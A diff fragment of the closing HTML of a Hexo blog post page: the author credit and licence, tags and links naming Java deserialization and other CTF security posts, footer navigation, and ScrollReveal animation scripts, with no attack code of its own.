- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Java/" class="tag">#Java</a><a href="/tags/反序列化/" class="tag">#反序列化</a><a href="/tags/CC链/" class="tag">#CC链</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Node.Js安全分析</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">PHP GC回收机制及其利用</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
